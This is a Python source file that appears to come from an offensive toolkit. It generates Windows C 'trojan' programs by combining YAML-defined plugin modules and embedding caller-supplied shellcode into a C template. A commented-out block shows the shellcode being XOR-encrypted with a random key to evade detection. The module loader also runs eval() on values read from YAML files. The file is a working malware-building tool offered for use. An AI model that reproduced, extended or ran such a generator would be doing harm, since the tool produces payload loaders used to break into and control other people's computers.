import yaml
from ClassCongregation import GetTrojanModulesFilePath
import ast
import struct
from ClassCongregation import randoms
import json
class TrojanStruct:
    def __init__(self):

        self.TrojanHeadersList = []  # 存放include内容
        self.TrojanPragmaList = []  # 存放预处理内容
        self.TrojanFunctionCallList = []  # 存放main函数中的调用
        self.TrojanCustomFunctionList = []  # 存放自定义函数
        self.TrojanGlobalList=[] #存放全局变量位置
        self.TrojanHeaders = str()
        self.TrojanPragma = str()
        self.TrojanFunctionCall = str()
        self.TrojanCustomFunction = str()
        self.TrojanGlobal=str()
        self.TrojanData = {}  # 存放最终数据

def ContentProcessing(FileName):
    f= open(FileName, 'r')
    Temp = yaml.load(f.read(),Loader=yaml.FullLoader)
    Set=Temp.get("set")
    if Set!=None:#判断是否有占位符
        Key=Placeholder(Set)
        YamlData=PlaceholderReplacement(str(Temp),Key)
        return YamlData
    else:
        return Temp

def Placeholder(Set):#对占位符规则进行提取
    Key={}
    for i in Set:
        Key[i] = eval(Set[i])
    return Key
def PlaceholderReplacement(Data,Key):#占位符替换
    for i in Key:
        if Key[i]==None:
            Data = Data.replace("{{" + i + "}}", "")
        else:
            Data=Data.replace("{{"+i+"}}", Key[i])
    return ast.literal_eval(Data)

def KeywordRulesExtraction(Key,Data):#提取文件中的关键字

    for key in Key:
        if Data["name"] == key:
            for data in Data["rules"]:
                for i in Key[key]:
                    if data["name"]==i:
                        return data

def GetHeaders(TrojanHeadersList,Headers):
    if Headers!=None:
        for i in Headers:
            if ("#"+i) not in TrojanHeadersList:#判断是否重复
                TrojanHeadersList.append("#"+i)
def GetPragma(TrojanPragmaList,Pragma):
    if Pragma != None:
        for i in Pragma:
            if ("#" + i) not in TrojanPragmaList:  # 判断是否重复
                TrojanPragmaList.append("#" + i)

def GetGlobal(TrojanGlobalList,Global):
    if Global != None:
        for i in Global:
            if i not in TrojanGlobalList:  # 判断是否重复
                TrojanGlobalList.append(i)
#对自定义函数进行处理
def GetCustomFunctions(TrojanCustomFunctionList,TrojanFunctionCallList,KeywordData):
    if KeywordData.get("data")!=None:
        for i in range(0,len(KeywordData.get("function"))):
            if KeywordData.get("parameter")[i][0]=="^":#判断是否是不需要主函数调用的值
                TrojanCustomFunctionList.append(
                    KeywordData.get("type")[i] + " " + KeywordData.get("function")[i] + KeywordData.get("parameter")[
                        i][1:] + "\n{\n" + KeywordData.get("data")[i] + "\n}")
            else:
                TrojanFunctionCallList.append(KeywordData.get("function")[i]+KeywordData.get("parameter")[i]+";")
                TrojanCustomFunctionList.append(KeywordData.get("type")[i]+" "+KeywordData.get("function")[i]+KeywordData.get("parameter")[i]+"\n{\n"+KeywordData.get("data")[i]+"\n}")


def GetFileList(TrojanModules):
    FileList=[]
    TrojanModulesFilePath=GetTrojanModulesFilePath().Result()
    for i in TrojanModules:
        FileList.append(TrojanModulesFilePath+i+".yml")
    return FileList
def CreateTrojanFiles(**kwargs):
    Struct=TrojanStruct()#初始化结构体
    #获取传入的shellcode
    global TrojanEncryption
    TrojanShellCode=kwargs.get("shellcode")
    TrojanEncryption=kwargs.get("encryption")#加密方式,在插件中实现
    TrojanModules = kwargs.get("trojan_modules")  # 模块集合
    FileList = GetFileList(TrojanModules)  # 所需要使用的插件列表
    for File in FileList:
        YamlData=ContentProcessing(File)
        KeywordData=KeywordRulesExtraction(TrojanModules,YamlData)
        # 提取当前规则中所需要的预处理和导入包
        GetHeaders(Struct.TrojanHeadersList,KeywordData.get("headers"))
        GetPragma(Struct.TrojanPragmaList,KeywordData.get("pragma"))
        GetGlobal(Struct.TrojanGlobalList,KeywordData.get("global"))
        #判断是不是唯一的主函数标识
        if YamlData.get("name")=="windows-c-entry-point":
            Struct.TrojanData["TrojanMian"] = KeywordData.get("function")
            Struct.TrojanData["TrojanMianParameter"] = KeywordData.get("parameter")
        else:
            GetCustomFunctions(Struct.TrojanCustomFunctionList,Struct.TrojanFunctionCallList,KeywordData)
    #对提取到的所有数据进行拼接处理
    for i in Struct.TrojanHeadersList:
        Struct.TrojanHeaders+=str(i)+"\n"
    Struct.TrojanData["TrojanHeaders"]=Struct.TrojanHeaders
    for i in Struct.TrojanPragmaList:
        Struct.TrojanPragma+=str(i)+"\n"
    Struct.TrojanData["TrojanPragma"] = Struct.TrojanPragma
    for i in Struct.TrojanFunctionCallList:
        Struct.TrojanFunctionCall+=str(i)+"\n"
    Struct.TrojanData["TrojanFunctionCall"] = Struct.TrojanFunctionCall
    for i in Struct.TrojanCustomFunctionList:
        Struct.TrojanCustomFunction+=str(i)+"\n"
    for i in Struct.TrojanGlobalList:
        Struct.TrojanGlobal+=str(i)+"\n"
    Struct.TrojanData["TrojanGlobal"] = Struct.TrojanGlobal
    Struct.TrojanData["TrojanHeaders"]=Struct.TrojanHeaders
    Struct.TrojanData["TrojanCustomFunction"] = Struct.TrojanCustomFunction
    Struct.TrojanData["TrojanShellCode"] = TrojanShellCode


    Trojan=r"""
{TrojanHeaders}
{TrojanPragma}
unsigned char trojan_shellcode[] = "{TrojanShellCode}";
{TrojanCustomFunction}
int {TrojanMian}{TrojanMianParameter}
{{
    
    {TrojanFunctionCall}

}}
    """.format(**Struct.TrojanData)
    return Trojan

# BytesTypeBinaryData = BinaryDataTypeConversion().StringToBytes(Shellcode)  # 对数据进行类型转换
# GenerateRandomNumber = random.randint(1, 255)  # 生成的随机数
# XOREncryption = BinaryDataTypeConversion().XOR(GenerateRandomNumber, BytesTypeBinaryData)  # 进行XOR加密